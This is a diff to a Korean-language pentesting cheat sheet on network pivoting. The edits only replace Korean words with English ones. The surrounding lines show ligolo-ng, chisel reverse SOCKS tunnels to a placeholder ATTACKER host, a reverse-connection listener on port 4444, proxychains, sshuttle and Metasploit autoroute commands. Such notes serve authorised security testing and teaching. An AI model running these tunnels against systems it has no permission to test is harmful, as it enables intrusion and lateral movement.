@@ -18,7 +18,7 @@ sudo ip link set ligolo up
 # Proxy 서버 실행
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# 세션 선택 후 라우팅 추가
+# session 선택 후 라우팅 추가
 >> session
 >> ifconfig  # 내부 네트워크 대역 확인
 
@@ -29,7 +29,7 @@ sudo ip route add 10.0.0.0/24 dev ligolo
 >> start
 ```
 
-### 타겟 (Agent)
+### target (Agent)
 
 ```bash
 # Linux
@@ -42,7 +42,7 @@ sudo ip route add 10.0.0.0/24 dev ligolo
 ### 리스너 (Reverse Connection)
 
 ```bash
-# ligolo 세션에서 리스너 추가
+# ligolo session에서 리스너 추가
 >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 
 # 내부 호스트에서 피봇 호스트의 4444로 연결하면
@@ -61,7 +61,7 @@ HTTP/SOCKS5 터널링. 단일 바이너리, 크로스플랫폼.
 # 공격자 (서버)
 ./chisel server -p 8080 --reverse
 
-# 타겟 (클라이언트)
+# target (클라이언트)
 ./chisel client ATTACKER:8080 R:socks
 
 # proxychains 설정 (/etc/proxychains4.conf)
@@ -81,7 +81,7 @@ proxychains nxc smb 10.0.0.5
 
 # 로컬 포트 포워딩
 ./chisel client ATTACKER:8080 8888:10.0.0.5:80
-# → 타겟의 localhost:8888 = 내부 10.0.0.5:80
+# → target의 localhost:8888 = 내부 10.0.0.5:80
 ```
 
 ---
@@ -147,7 +147,7 @@ sshuttle --dns -r user@PIVOT 10.0.0.0/24
 ## Metasploit Pivoting
 
 ```bash
-# Meterpreter 세션에서
+# Meterpreter session에서
 meterpreter> run autoroute -s 10.0.0.0/24
 meterpreter> background
 
